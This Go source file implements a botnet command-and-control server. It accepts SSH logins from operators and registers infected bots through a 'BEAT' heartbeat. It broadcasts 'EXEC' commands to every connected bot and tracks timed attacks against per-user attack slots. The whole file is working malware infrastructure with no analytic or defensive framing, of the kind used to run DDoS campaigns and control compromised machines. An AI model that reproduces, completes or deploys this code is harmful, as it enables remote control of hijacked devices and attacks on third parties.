package server

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/malasahjagotwin/cnc/config"
	"github.com/malasahjagotwin/cnc/internal/auth"
	"github.com/malasahjagotwin/cnc/internal/hostkey"
	"github.com/malasahjagotwin/cnc/internal/prompt"
	"github.com/malasahjagotwin/cnc/internal/shell"
)

type Server struct {
	cfg    *config.Config
	users  *auth.Store
	theme  prompt.Theme
	sshCfg *ssh.ServerConfig

	mu            sync.Mutex
	bots          map[string]shell.Bot
	conns         map[string]net.Conn
	activeAttacks int
	totalSlots    int
}

func New(cfg *config.Config) (*Server, error) {
	users, err := auth.Load(cfg.UsersFile)
	if err != nil {
		return nil, err
	}

	signer, err := hostkey.LoadOrCreate(cfg.HostKeyFile)
	if err != nil {
		return nil, fmt.Errorf("host key: %w", err)
	}

	s := &Server{
		cfg:        cfg,
		users:      users,
		theme:      prompt.DefaultTheme,
		bots:       map[string]shell.Bot{},
		conns:      map[string]net.Conn{},
		totalSlots: users.Slots(),
	}

	s.sshCfg = &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if s.users.Authenticate(c.User(), string(pass)) {
				return &ssh.Permissions{}, nil
			}
			return nil, fmt.Errorf("bad credentials for %q", c.User())
		},
	}
	s.sshCfg.AddHostKey(signer)

	return s, nil
}

func (s *Server) ListenAndServe() error {
	ln, err := net.Listen("tcp", s.cfg.Address())
	if err != nil {
		return fmt.Errorf("listen %s: %w", s.cfg.Address(), err)
	}
	fmt.Printf("C2 server listening on %s (%d users loaded)\n", s.cfg.Address(), s.users.Count())

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go s.handleTCP(conn)
	}
}

func (s *Server) Bots() []shell.Bot {
	s.mu.Lock()
	defer s.mu.Unlock()

	list := make([]shell.Bot, 0, len(s.bots))
	for _, b := range s.bots {
		list = append(list, b)
	}
	return list
}

func (s *Server) Broadcast(cmd string) int {
	s.mu.Lock()
	defer s.mu.Unlock()

	n := 0
	for key, c := range s.conns {
		if _, err := fmt.Fprintf(c, "EXEC %s\n", cmd); err != nil {
			delete(s.bots, key)
			delete(s.conns, key)
			c.Close()
			continue
		}
		n++
	}
	return n
}

func (s *Server) Launch(dur int) {
	s.mu.Lock()
	s.activeAttacks++
	s.mu.Unlock()
	time.AfterFunc(time.Duration(dur)*time.Second, func() {
		s.mu.Lock()
		if s.activeAttacks > 0 {
			s.activeAttacks--
		}
		s.mu.Unlock()
	})
}

func (s *Server) Attacks() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.activeAttacks
}

func (s *Server) TotalSlots() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.totalSlots
}

func (s *Server) handleTCP(conn net.Conn) {
	r := bufio.NewReader(conn)
	head, err := r.Peek(3)
	if err != nil {
		conn.Close()
		return
	}
	if string(head) == "SSH" {
		s.handleSSH(&bufferedConn{conn, r})
		return
	}
	s.handleBot(conn, r)
}

type bufferedConn struct {
	net.Conn
	r *bufio.Reader
}

func (c *bufferedConn) Read(p []byte) (int, error) {
	return c.r.Read(p)
}

func (s *Server) handleBot(conn net.Conn, r *bufio.Reader) {
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	line, err := r.ReadString('\n')
	if err != nil {
		return
	}
	conn.SetReadDeadline(time.Time{})

	fields := strings.Fields(strings.TrimSpace(line))
	if len(fields) < 2 || fields[0] != "BEAT" {
		return
	}

	arch := fields[1]
	name := "bot"
	if len(fields) >= 3 {
		name = fields[2]
	}
	key := conn.RemoteAddr().String()
	bot := shell.Bot{Username: name, Remote: key, Arch: arch}

	s.mu.Lock()
	s.bots[key] = bot
	s.conns[key] = conn
	total := len(s.bots)
	s.mu.Unlock()
	fmt.Printf("[%s] bot up: %s (%s) — total bots: %d\n",
		time.Now().Format("15:04:05"), name, arch, total)

	defer func() {
		s.mu.Lock()
		delete(s.bots, key)
		delete(s.conns, key)
		total := len(s.bots)
		s.mu.Unlock()
		fmt.Printf("[%s] bot down: %s (%s) — total bots: %d\n",
			time.Now().Format("15:04:05"), name, key, total)
	}()

	for {
		if _, err := r.ReadString('\n'); err != nil {
			return
		}
	}
}

func (s *Server) handleSSH(nConn net.Conn) {
	sshConn, chans, reqs, err := ssh.NewServerConn(nConn, s.sshCfg)
	if err != nil {
		nConn.Close()
		return
	}
	defer sshConn.Close()

	go ssh.DiscardRequests(reqs)

	username := sshConn.User()
	user, ok := s.users.Get(username)
	if !ok {
		user = auth.User{Username: username}
	}

	fmt.Printf("[%s] operator connect: %s (%s)\n",
		time.Now().Format("15:04:05"), username, sshConn.RemoteAddr().String())
	defer fmt.Printf("[%s] operator disconnect: %s\n",
		time.Now().Format("15:04:05"), username)

	for newCh := range chans {
		if newCh.ChannelType() != "session" {
			newCh.Reject(ssh.UnknownChannelType, "only session channels are supported")
			continue
		}
		channel, requests, err := newCh.Accept()
		if err != nil {
			continue
		}

		sess := shell.New(channel, s.theme, user, s.cfg.Hostname, s.Bots, s.Broadcast, s.Attacks, s.TotalSlots, s.Launch)

		go func(in <-chan *ssh.Request) {
			for req := range in {
				switch req.Type {
				case "pty-req":
					if w, h, ok := parsePtyReq(req.Payload); ok {
						sess.SetSize(w, h)
					}
					req.Reply(true, nil)
				case "window-change":
					if w, h, ok := parseDims(req.Payload); ok {
						sess.SetSize(w, h)
					}
				case "shell":
					req.Reply(true, nil)
				default:
					req.Reply(false, nil)
				}
			}
		}(requests)

		go sess.Run()
	}
}

func parsePtyReq(payload []byte) (width, height int, ok bool) {
	if len(payload) < 4 {
		return 0, 0, false
	}
	termLen := binary.BigEndian.Uint32(payload)
	rest := payload[4:]
	if uint32(len(rest)) < termLen+8 {
		return 0, 0, false
	}
	return parseDims(rest[termLen:])
}

func parseDims(payload []byte) (width, height int, ok bool) {
	if len(payload) < 8 {
		return 0, 0, false
	}
	return int(binary.BigEndian.Uint32(payload)), int(binary.BigEndian.Uint32(payload[4:])), true
}